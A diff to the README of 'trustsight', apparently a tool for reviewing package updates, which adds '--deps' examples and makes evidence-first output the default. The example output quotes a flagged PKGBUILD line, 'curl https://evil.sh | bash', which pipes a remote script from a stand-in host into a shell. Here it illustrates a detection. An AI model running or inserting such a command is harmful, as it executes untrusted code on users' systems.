@@ -111,6 +111,8 @@ trustsight inspect some-pkg              # depth 1, the default
 trustsight inspect some-pkg --depth 0    # this package only
 trustsight inspect some-pkg --depth 3    # three levels
 trustsight review --depth -1             # the whole closure
+trustsight review --deps                 # dependencies as the report subjects
+trustsight review --deps --depth 2       # direct dependencies and theirs
 ```
 
 Set it permanently in `config.toml`:
@@ -150,7 +152,7 @@ the cache.
 ## The 30-second example
 
 ```bash
-trustsight review --score
+trustsight review
 ```
 
 ```
@@ -160,29 +162,24 @@ trustsight review --score
 │           before building.                                           │
 │  Changed  pkgver 10.0.0-1 -> 10.1.0-2                               │
 │           checksums checksum added or changed                        │
-│  Score    0/100 (Low)                                                │
 ╰──────────────────────────────────────────────────────────────────────╯
 ╭──────────────────────────── sketchy-pkg ─────────────────────────────╮
 │  Version  1.4.2-1  →  1.5.0-2                                       │
 │  Status   The update is not trivial. Review it.                      │
-│           PKGBUILD line 4 [R001]  Remote Script Execution: curl      │
-│           https://evil.sh | bash [R001]                              │
-│            [SOURCE_BUCKET]  Source URL classified as unknown         │
-│           (https://evil.sh) [SOURCE_BUCKET]                          │
+│  Finding  PKGBUILD line 4 [R001] Remote Script Execution: curl       │
+│           https://evil.sh | bash                                     │
+│  Finding  [SOURCE_BUCKET] Source URL classified as unknown            │
+│           (https://evil.sh)                                           │
 │  Changed  source host added: evil.sh                                 │
-│  Score    60/100 (High)                                              │
 ╰──────────────────────────────────────────────────────────────────────╯
-2 package(s) needing update and reviewed out of 2 installed, 1 above the
-20-point UNFLAGGED threshold
+2 package(s) needing update and reviewed out of 2 installed
 ```
 
 One panel per package, and every signal is shown with the file, line and rule
-that produced it. You see **why** the score is what it is.
+that produced it. You see **why** the update needs review.
 
-The `--score` flag is doing real work here. Without it the score and the band
-are withheld and every panel border is neutral: the evidence is the default
-output, and the number is something you ask for. `--risk` shows the band
-alone.
+The default is evidence-first. Add `--score` to show the numeric score and
+band, or `--risk` for the band alone.
 
 ---
 
